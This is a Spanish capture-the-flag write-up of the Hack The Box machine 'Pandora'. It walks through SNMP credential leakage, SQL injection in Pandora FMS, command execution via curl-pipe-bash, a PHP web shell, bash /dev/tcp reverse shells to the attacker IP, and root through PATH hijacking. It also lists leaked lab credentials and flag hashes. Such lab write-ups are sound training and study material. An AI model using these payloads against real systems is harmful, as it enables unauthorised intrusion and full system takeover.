---
tags:
  - env/linux
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/423
dificultad: Media
ip: 10.10.11.136
os: Linux
relacionados:
  - "[[SNMP]]"
  - "[[Information Leakage]]"
  - "[[Local Port Forwarding]]"
  - "[[SQL Injection (SQLi)|SQLI]]"
  - "[[CVE-2019-20224]]"
  - "[[PATH Hijacking]]"
---
# HackTheBox - Pandora

## Reconocimiento

### Escaneo de Puertos con Nmap

Para comenzar, lancé un escaneo de puertos TCP a la máquina objetivo utilizando **Nmap** para identificar los servicios expuestos.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 00_Reconnaissance/allports
nmap -sCV -p22,80 $(cat ip) -oN 00_Reconnaissance/pandora-sCV
```
El resultado reveló dos puertos abiertos: **SSH (22)** y un servidor web **Apache (80)**. Al visitar el sitio web, confirmé que era una página estática sin funcionalidades de interés.

Posteriormente, realicé un escaneo de puertos UDP:
```Bash
nmap -sU 10.10.11.136
```
Este escaneo confirmó que el puerto **161** estaba abierto, ejecutando el servicio **SNMP**, el cual se convirtió en mi principal foco de atención.

### Enumeración de SNMP

#### Opción 1: `snmpwalk` o `snmpbulkwalk`

Utilicé la herramienta `snmpbulkwalk` para consultar todas las variables disponibles en el servicio, usando la comunidad `public`, que es una configuración común por defecto.
```Bash
snmpbulkwalk -v 1 -c public 10.10.11.136
```

Entre la gran cantidad de información devuelta, encontré una línea que revelaba credenciales en texto plano, probablemente de un script de monitoreo.

> [!warning] Credenciales Expuestas
> 
> Se encontraron credenciales de usuario en texto plano a través de una consulta SNMP.
> 
> Usuario: daniel
> 
> Contraseña: HotelBabylon23

Con estas credenciales, ya tenía un punto de entrada claro al sistema.

#### Opción 2: Nmap

```bash
nmap -sUCV -p161 $(cat ip) -o 00_Reconnaissance/pandora-sU
```
El mismo nmap expone las credenciales en este caso.


---

## Análisis de vulnerabilidades

### Fuga de Credenciales por SNMP

La primera vulnerabilidad identificada es una **configuración insegura del servicio SNMP**. Permitir consultas con la cadena de comunidad "public" es una mala práctica, pero el problema principal fue que el servicio exponía información sensible, incluyendo las credenciales del usuario `daniel` en texto plano.

### Descubrimiento de Servicio Interno

Una vez dentro como `daniel`, el análisis de la configuración de Apache en `/etc/apache2/sites-enabled/pandora.conf` reveló un servicio web adicional. Se trataba de una instancia de **Pandora FMS v7.0NG.742**, la cual solo era accesible desde `localhost`, constituyendo una superficie de ataque interna.

### Pandora FMS: Inyección SQL y RCE

Una búsqueda de vulnerabilidades para esa versión específica de Pandora FMS arrojó dos fallos críticos:

1. **Inyección SQL:** Una vulnerabilidad en `include/chart_generator.php` a través del parámetro `session_id`, que podía ser explotada para eludir la autenticación.
    
2. **Ejecución Remota de Comandos (RCE):** Una vez autenticado, era posible ejecutar comandos arbitrarios a través de una funcionalidad del panel de "Eventos".
    

### Escalada de Privilegios: Binario SUID con PATH Hijacking

El análisis de binarios con permisos SUID reveló `/usr/bin/pandora_backup`. El análisis estático de este archivo con `strings` mostró que ejecutaba el comando `tar` usando una ruta relativa. Esto lo convierte en un candidato perfecto para una vulnerabilidad de **PATH Hijacking**, donde puedo controlar qué ejecutable `tar` es invocado por el binario SUID.


---

## Explotación de vulnerabilidades

### Acceso Inicial como 'daniel'

Usando las credenciales encontradas (`daniel:HotelBabylon23`), me conecté exitosamente a la máquina a través de SSH.
```Bash
ssh daniel@10.10.11.136
```

Desde aquí, procedí con el plan para moverme lateralmente hacia el usuario `matt`.

### Port Forwarding para Acceder a Pandora FMS

#### Opción 1: Uso de `SOCKS5`

Para acceder a la consola de Pandora FMS, establecí un túnel SSH con reenvío de puertos dinámico. Este comando crea un proxy SOCKS5 en mi puerto local `9090` que enruta el tráfico a través de la conexión SSH.
```Bash
ssh -D 9090 daniel@10.10.11.136
```

Luego, configuré mi navegador y mis herramientas (como `sqlmap`) para usar este proxy.

#### Opción 2: Local Port Forwarding

Redirijo el puerto 80 de la maquina victima a mi maquina.
```bash
ssh daniel@10.10.11.136 -L 80:localhost:80
```


### Inyección SQL para Robo de Sesión

#### Opción 1: Robo de la cookie con `sqlmap`.

Utilicé `sqlmap` a través de `proxychains` para explotar la inyección SQL y extraer datos de la base de datos. El objetivo era la tabla de sesiones.
```Bash
# Configurar /etc/proxychains4.conf con: socks5 127.0.0.1 9090
proxychains sqlmap -u "http://localhost/pandora_console/include/chart_generator.php?session_id='" -T tsessions_php --dump
```

Esta acción me proporcionó un ID de sesión activo del usuario `matt`. Al colocar esta cookie de sesión en mi navegador, obtuve acceso a su panel de Pandora FMS.

#### Opción 2: Código del script 

El código del script `sqlpwn.py` tiene una porte donde roba la cookie directamente, al poner eso en el navegador y luego actualizar la pagina base ya tengo acceso a la web.
```http
http://localhost/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO
```


### RCE para Obtener Shell como 'matt'

#### Opción 1: Sección `Events`.

Ya autenticado como `matt`, navegué a la sección "Events" y capturé la solicitud con **Burp Suite**. Modifiqué la petición POST al endpoint vulnerable, insertando un payload de `curl` para descargar y ejecutar un script de reverse shell desde mi máquina.

```
# Payload dentro del parámetro 'target' de la petición
curl+10.10.14.6/shell.sh|bash
```

Tras enviar la petición, recibí una shell en mi listener de Netcat como el usuario `matt`, lo que me permitió leer el flag `user.txt`.

#### Opción 2: Sección `File Manager`

En la sección mencionada puedo subir archivos, subo un archivo `.php` malicioso y luego ejecuto una reverse shell para obtener acceso como el usuario `matt`. 

```bash
nc -nlvp 443
```
```http
http://localhost/pandora_console/images/reverse_shell.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.17/443 0>%261''
```


---

## Escalada de privilegios

### Evasión de la Shell Restringida

#### Opción 1:  Reprogramando la shell

Al intentar ejecutar `/usr/bin/pandora_backup`, me topé con un error de permisos a pesar de que el binario tenía el bit SUID. Esto era un claro indicio de que me encontraba en una **shell restringida** (probablemente `rbash`), que limita las acciones que un usuario puede realizar.

Para escapar de esta restricción, utilicé una técnica de GTFOBins con el comando `at` para programar la ejecución de una nueva shell no restringida.
```
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
```

#### Opción 2: Par de claves `ssh`

Al iniciar con `matt` me encuentro con que no reconoce los permisos del usuario, para solucionar eso creé un par de claves ssh y puse la clave publica en el `authorized_keys` de `matt`, al volver a entrar funciona con normalidad. 

### Identificación del Vector de Escalada: Binario SUID

Como `matt`, ejecuté el siguiente comando para encontrar posibles vectores de escalada basados en permisos SUID.
```Bash
find / -perm -4000 2>/dev/null
```

El binario `/usr/bin/pandora_backup` destacó inmediatamente como un archivo no estándar y potencialmente vulnerable.

### Análisis del Binario y Descubrimiento del PATH Hijacking

Transferí el binario a mi máquina con `netcat` y lo analicé con `strings`, confirmando que llamaba a `tar` de forma insegura.

### Explotación mediante PATH Hijacking

Seguí los pasos para materializar el ataque:

1. **Crear el payload:** En la máquina víctima, creé un archivo en `/tmp/tar` con mi payload de reverse shell.
    ```Bash
    #!/bin/bash
    bash -i >& /dev/tcp/10.10.14.6/4444 0>&1
    ```
    
2. **Dar permisos de ejecución:**
    ```Bash
    chmod +x /tmp/tar
    ```
    
3. **Modificar el PATH:** Antepuse el directorio `/tmp` a la variable de entorno `PATH`.
    ```Bash
    export PATH=/tmp:$PATH
    ```
    
4. **Iniciar el listener:** Puse un listener de `netcat` a la escucha en mi máquina en el puerto `4444`.
    
5. **Ejecutar el binario:**
    ```Bash
    /usr/bin/pandora_backup
    ```
    
El binario, ejecutándose como `root`, invocó mi script malicioso en `/tmp/tar`, lo que resultó en una shell de `root` en mi listener.


---

## Bandera(s)

> [!flag] `flag{user}`
> 8d8b43753f6734384a68159c701f411a
^bandera-user

> [!flag] `flag{root}`
> ac699f6e4788aa969562e93fae13422d
^bandera-root
